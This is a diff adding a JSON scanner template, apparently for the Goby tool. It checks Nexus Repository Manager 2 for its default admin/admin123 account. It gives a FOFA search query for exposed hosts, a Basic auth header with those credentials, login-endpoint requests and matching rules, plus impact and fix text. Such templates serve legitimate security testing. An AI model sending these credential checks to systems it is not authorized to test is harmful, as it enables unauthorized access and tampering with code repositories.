@@ -1,0 +1,110 @@
+{
+  "Name": "Nexus Repository Manager 2 default account",
+  "Description": "Nexus Repository Manager 2 establishes a default administrator user with default defaults.The breakthrough comes from the reset administrator account password being set to admin/admin123",
+  "Product": "Nexus-Repository-Manager-OSS",
+  "Homepage": "https://www.sonatype.com/nexus-repository-oss",
+  "DisclosureDate": "2019-07-08",
+  "Author": "mahui@gobies.org",
+  "FofaQuery": "app=\"sonatype-Nexus-Repository-Manager\"",
+  "Level": "3",
+  "Impact": "<p>Nexus Repository Manager 2仓库管理系统默认口令，攻击者可利用admin：admin123口令非法登陆代码仓库，修改系统配置，泄露系统敏感信息，并进行上传下载等操作，可通过对公共库的篡改，甚至植入后门。</p>",
+  "Recommandation": "<p>禁止公网访问</p><p>修改默认口令，最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p>",
+  "References": null,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+	"OR",
+	{
+	"Request": {
+		"method": "GET",
+		"uri": "/service/local/authentication/login",
+		"follow_redirect": true,
+		"header": {"Authorization":"Basic YWRtaW46YWRtaW4xMjM="},
+		"data_type": "text",
+		"data": ""
+	},
+	"ResponseTest": {
+		"type": "group",
+		"operation": "AND",
+		"checks": [
+			{
+				"type": "item",
+				"variable": "$code",
+				"operation": "==",
+				"value": "200",
+				"bz": ""
+			},
+			{
+				"type": "item",
+				"variable": "$body",
+				"operation": "contains",
+				"value": "true",
+				"bz": ""
+			},
+			{
+				"type": "item",
+				"variable": "$body",
+				"operation": "contains",
+				"value": "loggedInUsername",
+				"bz": ""
+			}
+		]
+		},
+		"SetVariable": []
+    },
+	{
+	"Request": {
+		"method": "GET",
+		"uri": "/nexus/service/local/authentication/login",
+		"follow_redirect": true,
+		"header": {"Authorization":"Basic YWRtaW46YWRtaW4xMjM="},
+		"data_type": "text",
+		"data": ""
+	},
+	"ResponseTest": {
+		"type": "group",
+		"operation": "AND",
+		"checks": [
+			{
+				"type": "item",
+				"variable": "$code",
+				"operation": "==",
+				"value": "200",
+				"bz": ""
+			},
+			{
+				"type": "item",
+				"variable": "$body",
+				"operation": "contains",
+				"value": "true",
+				"bz": ""
+			},
+			{
+				"type": "item",
+				"variable": "$body",
+				"operation": "contains",
+				"value": "loggedInUsername",
+				"bz": ""
+			}
+		]
+		},
+		"SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["defaultaccount"],
+  "CVEIDs": null,
+  "CVSSScore": "8.8",
+  "AttackSurfaces": {
+    "Application": ["Nexus-Repository-Manager-OSS"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": false
+}
